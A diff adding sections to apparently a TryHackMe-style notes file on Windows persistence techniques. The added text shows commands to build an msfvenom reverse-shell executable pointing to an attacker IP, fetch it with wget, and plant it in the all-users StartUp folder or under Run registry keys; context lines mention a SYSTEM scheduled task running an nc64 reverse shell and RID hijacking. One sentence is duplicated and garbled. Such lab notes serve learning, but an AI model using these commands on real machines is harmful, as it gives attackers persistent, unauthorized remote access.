@@ -351,6 +351,49 @@ The previous command will create a "THM-TaskBackdoor" task and execute an nc64 r
 The /sc and /mo options indicate that the task should be run every single minute.
 The /ru option indicates that the task will run with SYSTEM privileges.
 
+## Through Startup login triggering
+
+So there are some ways in which we can create the backdoor and put it in some places such that whenever the victim will restart its own device our backdoor will be triggered.
+
+Now there are many places in which we can put our executable but first let's make on using msfvenom and transfer it onto the victim.
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.71.43 LPORT=4450 -f exe -o revshell.exe
+```
+
+```bash
+wget http://10.17.71.43:8000/revshell.exe
+```
+
+We then store the payload into the We then store the payload into the "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" folder to get a shell back for any user logging into the machine.
+older to get a shell back for any user logging into the machine.
+
+```bash
+copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+```
+
+## Using registry starup
+
+You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:
+
+- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+The registry entries under HKCU will only apply to the current user,and those under HKLM will apply to everyone.
+Any program specified under the Run keys will run every time the user logs on.
+Programs specified under the RunOnce keys will only be executed a single time.
+
+Do the same thing with creating payload and all but this time you have to move the script to that registry instead of the program startup folder.
+
+```bash
+move revshell.exe C:\Windows
+```
+
+Let's then create a REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
+The entry's name can be anything you like, and the value will be the command we want to execute.
+
 ## RID Hijacking
 
 Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.
